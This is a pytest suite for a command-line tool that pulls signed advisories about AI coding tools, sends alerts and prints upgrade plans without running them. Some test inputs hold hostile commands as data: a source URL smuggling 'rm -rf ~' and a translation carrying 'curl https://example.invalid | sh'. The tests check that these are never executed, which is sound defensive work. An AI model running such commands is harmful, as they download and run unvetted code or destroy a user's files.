import json
import os
import stat
import subprocess

import pytest

from aitools_alerts import cli, config, inventory, notify, pull
from aitools_alerts.check import Match
from aitools_alerts.config import Settings
from aitools_alerts.inventory import Installed, Inventory
from aitools_alerts.notify import SendResult
from aitools_alerts.state import State
from aitools_alerts.schema import Action, Source
from mirror_helpers import FIXTURE_MIRROR, FIXTURE_ROOT, T0, advisory

MIRROR = FIXTURE_MIRROR.as_uri() + "/"
FIXTURE_SOURCE = "https://github.com/anthropics/claude-code/security/advisories/GHSA-fixt-fixt-fixt"


@pytest.fixture(autouse=True)
def env(home, monkeypatch):
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, FIXTURE_ROOT)
    write_config("")
    inv = Inventory(products={"claude-code": [Installed("Claude Code", "2.0.0", "/invented/bin/claude")],
                              "git": [Installed("git", "2.50.0", "/invented/bin/git")]})
    monkeypatch.setattr(inventory, "collect", lambda *a, **k: inv)

    def no_exec(*a, **k):
        raise AssertionError(f"executed {a!r}")
    monkeypatch.setattr(subprocess, "run", no_exec)
    monkeypatch.setattr(subprocess, "Popen", no_exec)
    return home


@pytest.fixture
def sent(monkeypatch):
    log = {"accept": True, "calls": []}

    def fake(channel, text, settings, **kw):
        log["calls"].append((channel, text))
        return SendResult(log["accept"], "fake")
    monkeypatch.setattr(notify, "send", fake)
    return log


def write_config(text: str):
    config.write_default(force=True)
    config.config_path().write_text("trust_root_override = true\n" + text)  # for FIXTURE_ROOT


# ------------------------------------------------------------ plan tests

def test_run_exit_code_2_on_unseen_critical(sent, capsys):
    write_config(f'mirror_url = "{MIRROR}"\n')
    assert cli.main(["run"]) == 2
    assert len(sent["calls"]) == 1 and sent["calls"][0][1].startswith("CRITICAL: Claude Code fixture")
    assert cli.main(["run"]) == 0  # seen now
    assert len(sent["calls"]) == 1


def test_notify_marks_seen_only_after_accepted(sent):
    assert cli.main(["pull", "--mirror-url", MIRROR]) == 0
    sent["accept"] = False
    assert cli.main(["notify"]) == 1
    assert State.load().seen == set()
    sent["accept"] = True
    assert cli.main(["notify"]) == 0
    assert len(State.load().seen) == 1
    assert cli.main(["notify"]) == 0 and len(sent["calls"]) == 2


def test_notify_text_contains_level_title_action_source():
    adv = advisory(title="Claude Code invented hole")
    inst = Installed("Claude Code", "2.0.0", "/invented")
    m = Match(adv=adv, installed=inst, actions_allowed=list(adv.actions), reason="affected",
              product=adv.products[0])
    text = notify.format_text(adv, m)
    lines = text.splitlines()
    assert lines[0] == "CRITICAL: Claude Code invented hole"
    assert "Affected: Claude Code 2.0.0 (fixed in 99.0.0)" in lines
    assert "Action: upgrade Claude Code to 99.0.0 or later" in lines
    assert lines[-1] == "Source: https://example.invalid/advisory"


def test_cli_init_writes_config_and_no_key_by_default(capsys):
    config.config_path().unlink()
    assert cli.main(["init"]) == 0
    assert config.config_path().is_file()
    assert not config.key_path().exists()
    assert config.load().mirror_url == config.DEFAULT_MIRROR_URL
    assert cli.main(["init"]) == 1  # no silent overwrite


# ------------------------------------------------------------------- extra

def test_init_make_key_writes_0600_and_prints_npub_not_nsec(capsys):
    config.config_path().unlink()
    assert cli.main(["init", "--make-key"]) == 0
    out = capsys.readouterr().out
    p = config.key_path()
    assert stat.S_IMODE(os.stat(p).st_mode) == 0o600
    nsec = p.read_text().strip()
    assert nsec.startswith("nsec1") and nsec not in out
    assert "npub1" in out and "Buzz" in out
    assert cli.main(["keygen"]) == 1  # never replaces a key
    assert p.read_text().strip() == nsec


def test_pull_then_check_prints_fixture_critical(capsys):
    config.config_path().unlink()
    assert cli.main(["init"]) == 0
    write_config("")
    assert cli.main(["pull", "--mirror-url", MIRROR]) == 0
    assert cli.main(["check"]) == 0
    out = capsys.readouterr()
    assert "CRITICAL: Claude Code fixture critical" in out.out
    assert "trust root overridden" in out.err


def test_check_json(capsys):
    cli.main(["pull", "--mirror-url", MIRROR])
    capsys.readouterr()
    assert cli.main(["check", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert [d["level"] for d in data] == ["critical"]
    assert data[0]["posted_by"] == "relay-bot"
    assert data[0]["source"] == FIXTURE_SOURCE and data[0]["source_primary"] is True
    assert data[0]["sources"] == [{"url": FIXTURE_SOURCE, "published_at": "2099-01-01"}]


def test_plan_prints_template_command_and_executes_nothing(capsys):
    write_config('auto_apply = ["upgrade"]\n')
    cli.main(["pull", "--mirror-url", MIRROR])
    capsys.readouterr()
    assert cli.main(["plan", "AITA-FIXTURE-0001"]) == 0
    out = capsys.readouterr().out
    assert "command: npm install -g @anthropic-ai/claude-code@99.0.0" in out
    lines = out.splitlines()
    assert lines[1] == "  source: " + FIXTURE_SOURCE
    assert lines[2] == "  prepare (ask first):"
    # relay-bot post: opted-in upgrade still asks first
    assert "prepare (ask first)" in out and "auto-apply" not in out
    assert "nothing was executed" in out
    assert cli.main(["plan", "NOPE"]) == 1


def test_state_from_another_root_is_not_used(monkeypatch, capsys):
    cli.main(["pull", "--mirror-url", MIRROR])
    monkeypatch.delenv(cli.TRUST_ROOT_ENV)
    capsys.readouterr()
    assert cli.main(["check", "--json"]) == 0
    io = capsys.readouterr()
    assert json.loads(io.out) == [] and "another trust root" in io.err


def test_bad_trust_root_override(monkeypatch):
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, "nothex")
    with pytest.raises(SystemExit):
        cli.main(["check"])


@pytest.mark.parametrize("flag", ["", "trust_root_override = false\n"])  # default, explicit
@pytest.mark.parametrize("value", ["ab" * 32, "nothex"])
def test_trust_root_env_cannot_hide_an_alert_without_the_flag(sent, capsys, monkeypatch, value, flag):
    monkeypatch.setattr(cli, "TRUST_ROOT_PUBKEY", FIXTURE_ROOT)  # the pinned root signs the mirror
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, value)  # a project's environment points elsewhere
    config.config_path().write_text(f'mirror_url = "{MIRROR}"\n{flag}')
    assert cli.main(["run", "--json"]) == 2
    io = capsys.readouterr()
    data = json.loads(io.out)
    assert data["ignored_env"] == [cli.TRUST_ROOT_ENV] and len(data["unseen_critical"]) == 1
    assert data["pull_error"] is None and f"ignoring {cli.TRUST_ROOT_ENV}" in io.err


def test_trust_root_override_must_be_bool(capsys, tmp_path):
    assert config.load(tmp_path / "missing.toml").trust_root_override is False
    config.config_path().write_text('trust_root_override = "yes"\n')
    assert cli.main(["check"]) == 1 and "must be true or false" in capsys.readouterr().err


def test_pull_failure_exits_1(capsys):
    assert cli.main(["pull", "--mirror-url", "file:///nonexistent/mirror/"]) == 1
    assert "unreachable" in capsys.readouterr().err


def test_upgrade_command_only_from_templates():
    assert cli.upgrade_command("codex", "1.2.3") == ["npm", "install", "-g", "@openai/codex@1.2.3"]
    assert cli.upgrade_command("git", "2.0.0") is None
    assert cli.upgrade_command("claude-code", None) is None


# --------------------------------------------------------------- transports

class Run:
    def __init__(self, code=0):
        self.code, self.argv = code, None

    def __call__(self, argv, **kw):
        assert kw["shell"] is False and "timeout" in kw
        self.argv = argv
        return subprocess.CompletedProcess(argv, self.code, "", "")


@pytest.fixture
def on_path(monkeypatch):
    monkeypatch.setattr(notify.shutil, "which", lambda name: "/invented/" + name)


TEXT = 'CRITICAL: "quoted" end tell -- $(x) `y`'


def test_desktop_macos_text_is_one_argument_outside_the_script(on_path):
    r = Run()
    res = notify.send("desktop", TEXT, Settings(), run=r, platform="darwin")
    assert res.accepted
    assert r.argv[:3] == ["osascript", "-e", notify.OSASCRIPT] and r.argv[3] == TEXT
    assert TEXT not in notify.OSASCRIPT and len(r.argv) == 4


def test_desktop_linux_and_failure(on_path):
    r = Run()
    assert notify.send("desktop", TEXT, Settings(), run=r, platform="linux").accepted
    assert r.argv == ["notify-send", "--", notify.TITLE, TEXT]
    assert not notify.send("desktop", TEXT, Settings(), run=Run(1), platform="darwin").accepted


def test_imessage_and_signal_argv(on_path):
    r = Run()
    s = Settings(imessage_to="+15555550100", signal_to="+15555550101", signal_account="+15555550102")
    assert notify.send("imessage", TEXT, s, run=r).accepted
    assert r.argv == ["imsg", "send", "--to", "+15555550100", "--text", TEXT]
    assert notify.send("signal", TEXT, s, run=r).accepted
    assert r.argv == ["signal-cli", "-a", "+15555550102", "send", "-m", TEXT, "+15555550101"]


def test_missing_binary_not_accepted(monkeypatch):
    monkeypatch.setattr(notify.shutil, "which", lambda name: None)
    res = notify.send("imessage", TEXT, Settings(imessage_to="+15555550100"), run=Run())
    assert not res.accepted and "not installed" in res.detail


def test_telegram_token_file_must_be_private(home):
    tok = home / "telegram.token"
    tok.write_text("123456:invented-token\n")
    calls = []

    def post(url, payload):
        calls.append((url, payload))
        return 200, b'{"ok": true}'
    s = Settings(telegram_chat_id="12345", telegram_token_file=str(tok))
    os.chmod(tok, 0o644)
    res = notify.send("telegram", TEXT, s, post=post)
    assert not res.accepted and calls == []
    os.chmod(tok, 0o600)
    res = notify.send("telegram", TEXT, s, post=post)
    assert res.accepted and calls[0][1] == {"chat_id": "12345", "text": TEXT}
    assert "invented-token" not in res.detail


def test_webhook_accepts_2xx_only():
    s = Settings(webhook_url="https://example.invalid/hook")
    assert notify.send("webhook", TEXT, s, post=lambda u, p: (204, b"")).accepted
    assert not notify.send("webhook", TEXT, s, post=lambda u, p: (500, b"")).accepted

    def boom(u, p):
        raise OSError("down")
    assert not notify.send("webhook", TEXT, s, post=boom).accepted


def test_run_json_and_quiet(sent, capsys):
    write_config(f'mirror_url = "{MIRROR}"\n')
    capsys.readouterr()
    assert cli.main(["run", "--json"]) == 2
    data = json.loads(capsys.readouterr().out)
    assert data["pull_error"] is None and len(data["unseen_critical"]) == 1
    assert data["ignored_env"] == []
    assert data["matches"][0]["level"] == "critical"
    assert data["matches"][0]["source"] == FIXTURE_SOURCE
    assert [x["url"] for x in data["matches"][0]["sources"]] == [FIXTURE_SOURCE]
    assert cli.main(["run", "--quiet"]) == 0
    assert capsys.readouterr().out == ""


def test_plan_upgrade_without_fixed_prints_no_command(capsys, monkeypatch):
    from aitools_alerts import pull
    from aitools_alerts.schema import Product
    real = pull.advisories

    def no_fixed(st, dropped=None):
        return [pull.Thread(t.root_id, __import__("dataclasses").replace(
            t.adv, products=[Product("Claude Code", "claude-code", "<99.0.0", None)]), t.retracted, t.updated_at)
            for t in real(st)]
    monkeypatch.setattr(pull, "advisories", no_fixed)
    cli.main(["pull", "--mirror-url", MIRROR])
    capsys.readouterr()
    assert cli.main(["plan", "AITA-FIXTURE-0001"]) == 0
    out = capsys.readouterr().out
    assert "no fixed version given: notify only" in out and "npm" not in out


def test_telegram_failure_never_shows_token(home):
    tok = home / "telegram.token"
    tok.write_text("123456:invented-token\n")
    os.chmod(tok, 0o600)
    s = Settings(telegram_chat_id="12345", telegram_token_file=str(tok))

    def boom(url, payload):
        raise OSError(f"cannot reach {url}")
    for post in (boom, lambda u, p: (401, b'{"ok": false}'), lambda u, p: (200, b"not json")):
        res = notify.send("telegram", TEXT, s, post=post)
        assert not res.accepted and "invented-token" not in res.detail


# ------------------------------------------------ whole-branch review fixes

def test_notify_rereads_seen_under_the_lock(sent):
    cli.main(["pull", "--mirror-url", MIRROR])
    stale = State.load()
    a = type("A", (), {"root": FIXTURE_ROOT})()
    pending = cli._unseen_critical(a, stale)
    assert len(pending) == 1
    assert cli.main(["notify"]) == 0  # another run sends and marks it seen
    assert cli._notify(stale, config.load(), pending) == 0  # the stale run skips it
    assert len(sent["calls"]) == 1 and len(State.load().seen) == 1


def test_plan_auto_applies_an_opted_upgrade_from_a_curator_post(monkeypatch, capsys):
    from mirror_helpers import Mirror
    m = Mirror()
    m.root_post(m.cur_sec)
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    from aitools_alerts import pull
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    write_config('auto_apply = ["upgrade"]\n')
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    capsys.readouterr()
    assert cli.main(["plan", "AITA-TEST-0001"]) == 0
    out = capsys.readouterr().out
    assert "auto-apply (opted in):" in out and "prepare (ask first)" not in out
    assert "command: npm install -g @anthropic-ai/claude-code@99.0.0" in out
    write_config("auto_apply = []\n")
    cli.main(["plan", "AITA-TEST-0001"])
    out = capsys.readouterr().out
    assert "prepare (ask first)" in out and "auto-apply" not in out


def test_init_make_key_force_with_existing_key_changes_nothing(capsys):
    config.config_path().unlink()
    assert cli.main(["init", "--make-key"]) == 0
    config.config_path().write_text("notify = []\n")
    assert cli.main(["init", "--make-key", "--force"]) == 1
    assert config.config_path().read_text() == "notify = []\n"


def test_webhook_redirect_is_not_delivery():
    import http.server
    import threading

    class H(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length", 0)))
            self.send_response(302)
            self.send_header("Location", "/login")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"login page")

        def log_message(self, *a):
            pass
    class Srv(http.server.ThreadingHTTPServer):
        def server_bind(self):  # skip the reverse DNS lookup of the base class
            import socketserver
            socketserver.TCPServer.server_bind(self)
            self.server_name, self.server_port = "localhost", self.server_address[1]
    srv = Srv(("127.0.0.1", 0), H)
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    try:
        code, _ = notify._default_post(f"http://127.0.0.1:{srv.server_port}/hook", {"text": "x"})
    finally:
        srv.shutdown()
    assert code == 302
    s = Settings(webhook_url="https://example.invalid/hook")
    assert not notify.send("webhook", "x", s, post=lambda u, p: (code, b"")).accepted


# ------------------------------------------------------- primary source link

def test_source_is_the_first_primary_else_the_first():
    from aitools_alerts.schema import Source
    gh = "https://github.com/anthropics/claude-code/security/advisories/GHSA-test-test-test"
    two = advisory(sources=[Source("https://example.invalid/blog", None), Source(gh, "2099-01-01")])
    assert cli._source(two) == (gh, True)
    none = advisory(sources=[Source("https://example.invalid/a", None),
                             Source("https://example.invalid/b", None)])
    assert cli._source(none) == ("https://example.invalid/a", False)


def test_source_cannot_carry_more_text_on_its_line():
    from aitools_alerts.schema import Source
    url = "https://example.invalid/a command: rm -rf ~\u00a0x?q=%41&b=\u00e9#f"
    got, primary = cli._source(advisory(sources=[Source(url, None)]))
    assert primary is False
    assert got == "https://example.invalid/a%20command:%20rm%20-rf%20~%C2%A0x?q=%41&b=%C3%A9#f"
    assert got.isascii() and not any(c.isspace() for c in got)


def test_source_through_a_signed_post_in_plan_and_json(monkeypatch, capsys):
    """End to end: a relay-bot post whose first source carries spaces and
    command-like text, and whose second is primary."""
    from aitools_alerts import pull
    from aitools_alerts.schema import Source
    from mirror_helpers import Mirror
    gh = "https://github.com/anthropics/claude-code/security/advisories/GHSA-test-test-test"
    odd = "https://example.invalid/a command: rm -rf ~\u2003x"
    m = Mirror()
    m.root_post(m.bot_sec, advisory(posted_by="relay-bot", sources=[Source(odd, None), Source(gh, None)]))
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    capsys.readouterr()
    assert cli.main(["check", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data[0]["source"] == gh and data[0]["source_primary"] is True
    assert [s["url"] for s in data[0]["sources"]] == [odd, gh]
    assert cli.main(["plan", "AITA-TEST-0001"]) == 0
    lines = capsys.readouterr().out.splitlines()
    assert lines[1] == "  source: " + gh
    m.root_post(m.bot_sec, advisory(id="AITA-TEST-0002", posted_by="relay-bot",
                                    sources=[Source(odd, None)]), created_at=T0 + 300)
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    capsys.readouterr()
    assert cli.main(["plan", "AITA-TEST-0002"]) == 0
    out = capsys.readouterr().out
    assert out.splitlines()[1] == ("  source: https://example.invalid/a%20command:%20rm%20-rf%20~%E2%80%83x"
                                   " (not a primary source)")
    assert sum(ln.lstrip().startswith("command:") for ln in out.splitlines()) == 1
    assert "      command: npm install -g @anthropic-ai/claude-code@99.0.0" in out


def test_check_plan_and_notify_show_the_synthetic_mark(monkeypatch, capsys, sent):
    from aitools_alerts import pull, schema
    from aitools_alerts.poster import compose, rules
    from aitools_alerts.poster.candidates import Candidate, Source
    from mirror_helpers import T0, Mirror, asdict
    m = Mirror()
    c = Candidate(id="CVE-2099-0010", aliases=(), product_text="Anthropic Claude Code",
                  advisory_severity=None, local_level_hint=None, exploited=True, trojanized=False,
                  injection_exec=False, fixed="99.0.0", affected="< 99.0.0", observed_at=None,
                  sources=(Source("https://github.com/anthropics/claude-code/security/advisories/"
                                  "GHSA-abcd-efgh-ijkl", None),))
    text, _ = compose.root_post(c, "critical", rules.scope_of(c.product_text), posted_at=T0)
    m.post(m.bot_sec, text, files=("feed.json", "critical.json"))
    # A root posted before the title carried the mark, and a patch that sets an unmarked title.
    old = asdict(advisory(id="CVE-2099-0011", posted_by="relay-bot", title="Claude Code: old test"))
    legacy = m.post(m.bot_sec, f"CRITICAL: x\n\n```{schema.INFO_STRING}\n{json.dumps(old)}\n```\n",
                    files=("feed.json", "critical.json"))
    m.reply(m.bot_sec, legacy, m.patch_text(title="Claude Code: real-looking"))
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    capsys.readouterr()
    want = "SYNTHETIC TEST: Claude Code: known exploited vulnerability (CVE-2099-0010)"
    assert cli.main(["check"]) == 0
    out = capsys.readouterr().out
    assert f"CRITICAL: {want} [Claude Code" in out
    assert "CRITICAL: SYNTHETIC TEST: Claude Code: real-looking [Claude Code" in out
    assert cli.main(["check", "--json"]) == 0
    titles = sorted(d["title"] for d in json.loads(capsys.readouterr().out))
    assert titles == [want, "SYNTHETIC TEST: Claude Code: real-looking"]
    assert cli.main(["plan", "CVE-2099-0010"]) == 0
    assert f"CRITICAL: {want}" in capsys.readouterr().out
    assert cli.main(["notify"]) == 0
    assert len(sent["calls"]) == 2
    assert all(t.startswith("CRITICAL: SYNTHETIC TEST: Claude Code") for _, t in sent["calls"])


def _two_copy_mirror(monkeypatch, **over):
    """A relay-bot critical posted as one root per channel, as the poster does."""
    from aitools_alerts import pull
    from mirror_helpers import Mirror
    m = Mirror()
    crit = m.root_post(m.bot_sec, advisory(posted_by="relay-bot"), files=("critical.json",))
    feed = m.root_post(m.bot_sec, advisory(posted_by="relay-bot", **over), files=("feed.json",),
                       created_at=T0 + 101)
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    write_config('mirror_url = "https://mirror.invalid/"\n')
    return m, crit["id"], feed["id"]


def test_a_critical_with_one_root_per_channel_lists_once(monkeypatch, capsys, sent):
    m, crit, feed = _two_copy_mirror(monkeypatch)
    assert cli.main(["pull"]) == 0
    capsys.readouterr()
    assert cli.main(["check"]) == 0
    lines = [ln for ln in capsys.readouterr().out.splitlines() if ln.startswith("CRITICAL:")]
    assert lines == [f"CRITICAL: Invented critical for tests [Claude Code 2.0.0: affected] "
                     f"(id AITA-TEST-0001, threads {crit[:12]}, {feed[:12]})"]
    assert cli.main(["check", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert len(data) == 1 and data[0]["thread"] == crit and data[0]["threads"] == [crit, feed]
    for ref in ("AITA-TEST-0001", feed):
        assert cli.main(["plan", ref]) == 0
        assert capsys.readouterr().out.count("CRITICAL: Invented critical") == 1
    assert cli.main(["run", "--json"]) == 2
    out = json.loads(capsys.readouterr().out)
    assert len(out["matches"]) == 1 and out["unseen_critical"] == sorted([crit, feed])
    assert len(sent["calls"]) == 1 and State.load().seen == {crit, feed}
    assert cli.main(["notify"]) == 0 and len(sent["calls"]) == 1


def test_a_seen_copy_makes_the_advisory_seen(monkeypatch, sent):
    """State the old code wrote saw only one copy; the other does not re-alert."""
    m, crit, feed = _two_copy_mirror(monkeypatch)
    assert cli.main(["pull"]) == 0
    st = State.load()
    st.seen.add(feed)
    st.save_seen()
    assert cli.main(["notify"]) == 0 and sent["calls"] == []


def test_different_ids_and_roles_still_list_apart(monkeypatch, capsys):
    from aitools_alerts import pull
    from mirror_helpers import Mirror
    m = Mirror()
    a = m.root_post(m.bot_sec, advisory(posted_by="relay-bot"))
    b = m.root_post(m.bot_sec, advisory(id="AITA-TEST-0002", posted_by="relay-bot"), created_at=T0 + 101)
    c = m.root_post(m.cur_sec, advisory(), created_at=T0 + 102)
    h = m.root_post(m.bot_sec, advisory(id="AITA-TEST-0003", level="high", posted_by="relay-bot"),
                    files=("feed.json",), created_at=T0 + 103)
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    capsys.readouterr()
    assert cli.main(["check", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert [(d["id"], d["posted_by"], d["threads"]) for d in data] == [
        ("AITA-TEST-0001", "relay-bot", [a["id"]]), ("AITA-TEST-0002", "relay-bot", [b["id"]]),
        ("AITA-TEST-0001", "curator", [c["id"]]), ("AITA-TEST-0003", "relay-bot", [h["id"]])]
    assert all(d["thread"] == d["threads"][0] for d in data)
    assert cli.main(["check"]) == 0
    out = capsys.readouterr().out
    assert f"HIGH: Invented critical for tests [Claude Code 2.0.0: affected] (id AITA-TEST-0003, thread {h['id'][:12]})" in out
    assert "4 advisories, 4 matches on this machine" in out


def test_copies_that_differ_list_apart_and_say_so(monkeypatch, capsys, sent):
    """An update one root has not had yet (here the feed copy names 2.x, which
    the critical copy does not reach): neither copy's match or alert is lost."""
    from aitools_alerts.schema import Product
    m, crit, feed = _two_copy_mirror(monkeypatch, level="high", products=[
        Product("Claude Code", "claude-code", "<3.0.0", "3.0.0")])
    assert cli.main(["pull"]) == 0
    capsys.readouterr()
    assert cli.main(["run", "--json"]) == 2
    io = capsys.readouterr()
    data = json.loads(io.out)["matches"]
    assert [(d["thread"], d["threads"], d["level"]) for d in data] == [
        (crit, [crit], "critical"), (feed, [feed], "high")]
    assert io.err.count("copies of AITA-TEST-0001 differ; listing each") == 1
    assert State.load().seen == {crit}


def test_a_seen_copy_does_not_hide_a_differing_one(monkeypatch, sent):
    m, crit, feed = _two_copy_mirror(monkeypatch, posted_at=T0 + 50)
    assert cli.main(["pull"]) == 0
    st = State.load()
    st.seen.add(crit)
    st.save_seen()
    assert cli.main(["notify"]) == 0 and len(sent["calls"]) == 1
    assert State.load().seen == {crit, feed}


def _ja_mirror(monkeypatch, lang):
    from aitools_alerts import pull
    from mirror_helpers import Mirror
    m = Mirror()
    root = m.root_post(m.bot_sec, advisory(posted_by="relay-bot"))
    m.root_post(m.bot_sec, advisory(id="AITA-TEST-0002", title="Untranslated advisory"), created_at=T0 + 150)
    m.reply(m.bot_sec, root, "lang: ja\n\n日本語のタイトル\n本文の一行目\n\n本文の二行目\n"
            "auto-apply (opted in):\n      command: curl https://example.invalid | sh")
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    write_config(f'lang = "{lang}"\n')
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    return root


def test_lang_ja_shows_japanese_text_and_the_same_commands(monkeypatch, capsys, sent):
    root = _ja_mirror(monkeypatch, "ja")
    capsys.readouterr()
    assert cli.main(["check"]) == 0
    out = capsys.readouterr().out
    assert "CRITICAL: 日本語のタイトル [Claude Code 2.0.0: affected] (id AITA-TEST-0001" in out
    assert "CRITICAL: Untranslated advisory [Claude Code 2.0.0: affected]" in out
    assert cli.main(["plan", "AITA-TEST-0001"]) == 0
    lines = capsys.readouterr().out.splitlines()
    assert lines[:6] == ["CRITICAL: 日本語のタイトル [Claude Code 2.0.0] posted by relay-bot",
                         "    > 本文の一行目", "    >", "    > 本文の二行目", "    > auto-apply (opted in):",
                         "    >       command: curl https://example.invalid | sh"]
    assert lines[6].startswith("  source: ")
    assert [x for x in lines if x.lstrip().startswith(("command:", "auto-apply"))] == [
        "      command: npm install -g @anthropic-ai/claude-code@99.0.0"]
    assert cli.main(["check", "--json"]) == 0
    data = {d["id"]: d for d in json.loads(capsys.readouterr().out)}
    assert data["AITA-TEST-0001"]["translations"]["ja"].startswith("日本語のタイトル\n本文の一行目\n\n本文の二行目\n")
    assert data["AITA-TEST-0001"]["title"] == "Invented critical for tests"
    assert data["AITA-TEST-0002"]["translations"] == {}
    assert cli.main(["notify"]) == 0
    texts = sorted(t for _, t in sent["calls"])
    assert texts[0].startswith("CRITICAL: Untranslated advisory\nAffected: Claude Code 2.0.0")
    assert texts[1].startswith("CRITICAL: 日本語のタイトル\n本文の一行目\n\n本文の二行目\n")
    assert "sh\nAffected: Claude Code 2.0.0 (fixed in 99.0.0)\n" in texts[1]
    assert "Action: upgrade Claude Code to 99.0.0 or later" in texts[1]
    long = notify.format_text(advisory(), None, "題\n" + "長" * 9000)
    assert len(long) <= notify.MAX_TEXT and long.startswith("CRITICAL: 題\n長")
    assert long.endswith("…\nAffected: Claude Code (fixed in 99.0.0)\nAction: upgrade Claude Code to 99.0.0"
                         " or later\nSource: https://example.invalid/advisory")
    assert root["id"][:12] in out


def test_lang_en_ignores_translations_except_in_json(monkeypatch, capsys):
    _ja_mirror(monkeypatch, "en")
    capsys.readouterr()
    assert cli.main(["check"]) == 0
    out = capsys.readouterr().out
    assert "日本語" not in out and "CRITICAL: Invented critical for tests [Claude Code" in out
    assert cli.main(["check", "--json"]) == 0
    assert any(d["translations"] for d in json.loads(capsys.readouterr().out))


def test_translation_merged_across_copies_and_long_title_falls_back(monkeypatch, capsys):
    from aitools_alerts import pull
    from mirror_helpers import Mirror
    m = Mirror()
    adv = advisory(posted_by="relay-bot")
    feed = m.root_post(m.bot_sec, adv, files=("feed.json",))
    crit = m.root_post(m.bot_sec, adv, files=("critical.json",), created_at=T0 + 101)
    assert feed["id"] != crit["id"]
    m.reply(m.bot_sec, feed, "lang: ja\n\n古い訳", created_at=T0 + 200)
    m.reply(m.bot_sec, crit, "lang: ja\n\n新しい訳", created_at=T0 + 300)
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    write_config('lang = "ja"\n')
    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
    capsys.readouterr()
    assert cli.main(["check"]) == 0
    out = capsys.readouterr().out
    assert "CRITICAL: 新しい訳 [Claude Code" in out and out.count("CRITICAL: ") == 1
    assert f"threads {feed['id'][:12]}, {crit['id'][:12]}" in out
    acts = [Action("upgrade", "Claude Code", "99.0.0")] * 20
    pad = notify.MAX_TEXT - 50 - len(notify.format_text(advisory(actions=acts, sources=[])))
    big = advisory(sources=[Source("https://example.invalid/" + "a" * (pad - 33), None)], actions=acts)
    english = notify.format_text(big)
    assert notify.MAX_TEXT - 60 < len(english) <= notify.MAX_TEXT
    assert notify.format_text(big, None, "長" * 200 + "\n本文" * 600) == english


def test_check_and_run_json_warn_when_the_mirror_is_stale(monkeypatch, sent, capsys):
    """A frozen mirror: pulls succeed, nothing new is signed (544a)."""
    from aitools_alerts import pull
    newest = T0 + 120  # the fixture's newest event
    write_config(f'mirror_url = "{MIRROR}"\n')
    monkeypatch.setattr(pull.time, "time", lambda: newest + 3600)
    cli.main(["pull"])
    capsys.readouterr()
    assert cli.main(["check"]) == 0 and "warning:" not in capsys.readouterr().out
    monkeypatch.setattr(pull.time, "time", lambda: newest + 4 * 86400)
    assert cli.main(["check"]) == 0
    other = type("A", (), {"root": "0" * 64})()  # state under another root verifies nothing for this one
    assert cli._unverified(other, State.load()) == cli.OTHER_ROOT and cli._stale_since(other, State.load())
    out = capsys.readouterr().out.splitlines()
    assert out[0] == cli.UNVERIFIED_LINE.format(reason="checkpoint out of date")
    assert out[1] == cli.STALE_LINE.format(since="2099-01-01T00:02:00Z")  # the checkpoint's own time
    assert cli.main(["run", "--json"]) == 2  # stale never changes the exit status
    raw = capsys.readouterr().out
    assert json.loads(raw)["stale_since"] == "2099-01-01T00:02:00Z"
    assert json.loads(raw)["unverified"] == "checkpoint out of date"
    assert '"stale_since": "' in raw  # the hook's match, on the real output
    monkeypatch.setattr(pull.time, "time", lambda: newest + 3600)
    assert cli.main(["run", "--json"]) == 0
    raw = capsys.readouterr().out
    assert json.loads(raw)["stale_since"] is None and '"stale_since": "' not in raw
    assert json.loads(raw)["unverified"] is None
    hostile = json.dumps({"stale_since": None, "title": '"stale_since": "x'}, indent=2)
    assert '"stale_since": "' not in hostile  # a quote in a value is escaped


@pytest.mark.parametrize("argv", [["pull"], ["check"], ["check", "--json"], ["notify"],
                                  ["plan", "AITA-FIXTURE-0001"], ["run"], ["run", "--json"]])
def test_broken_channel_spec_is_one_error_line(tmp_path, monkeypatch, capsys, argv):
    """ai-tools-alerts#gefy: without the channel ids no event can be bound, so every
    command stops with one line before it half-runs (run would print a pull error,
    then fail again reading the stored events)."""
    cli.main(["pull", "--mirror-url", MIRROR])
    capsys.readouterr()
    spec = tmp_path / "spec"
    spec.mkdir()
    (spec / "channels.json").write_text('{"feed": "not-a-uuid"}')
    monkeypatch.setattr(pull.schema, "SPEC_DIR", spec)
    assert cli.main(argv) == 1
    out = capsys.readouterr()
    lines = [x for x in out.err.splitlines() if "trust root overridden" not in x]  # the test root's warning
    assert out.out == "" and len(lines) == 1 and "Traceback" not in out.err
    assert lines[0].startswith("aitools-alerts: spec/channels.json does not name the alert channels")


def test_events_dated_ahead_are_said_out_loud(monkeypatch, capsys, reader_clock):
    """A machine whose clock is behind refuses genuine new events; pull and run say so."""
    m, _, _ = _two_copy_mirror(monkeypatch)
